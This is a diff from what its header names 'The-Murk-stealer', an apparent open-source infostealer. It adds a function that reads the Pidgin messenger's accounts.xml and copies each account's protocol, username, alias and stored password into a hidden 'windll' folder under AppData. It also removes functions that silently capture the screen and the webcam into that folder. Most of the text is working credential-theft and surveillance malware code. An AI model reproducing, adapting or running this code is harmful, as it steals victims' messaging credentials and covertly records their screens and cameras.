@@ -9,27 +9,41 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
-from PIL import ImageGrab
-from os import environ,sep
-import cv2
+import os
+import xml.etree.ElementTree as ET
 
-def Screenshot():
-	try:
-		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
-		screen = ImageGrab.grab()
-		screen.save(rf'{pathtofolder}\windll\Photos\sreenshot.jpg')
-		print("screen")
-	except Exception as e:
-		print(e)
 
-def WebCam(): 
-	try:
-		pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
-		cap = cv2.VideoCapture(0)
-		for i in range(30):
-			cap.read()
-		ret, frame = cap.read()
-		cv2.imwrite(pathtofolder+'\\windll\\Photos\\webcam.png', frame)   
-		cap.release()
-	except:
-	    pass
+def Pidgin(data):
+    appdata = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming'
+    pathtofile = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\windll'
+    directory = [
+        appdata + '\\.purple\\accounts.xml'
+    ]
+
+    logs = []
+    
+    for file in directory:
+        if os.path.isfile(file):
+            with open(file, "r", encoding="utf-8") as f:
+                content = f.read()
+            
+            content = ET.fromstring(content)
+            accounts = content.findall("account")
+            for account in accounts:
+                protocol = account.findtext("protocol")
+                name = account.findtext('name')
+                alias = account.findtext('alias')
+                password = account.findtext('password')
+
+                logs.append(f"""Protocol: {protocol}
+Name: {name}
+Alias: {alias}
+Password: {password}
+""")
+        if logs:
+            data.append("\n∟📨Pidgin")
+            os.mkdir(pathtofile+"\\Pidgin\\")
+            with open(pathtofile+"\\Pidgin\\accounts.txt", 'w', encoding='UTF-8') as f:
+                for log in logs:
+                    f.write(log+'\n')
+    return data
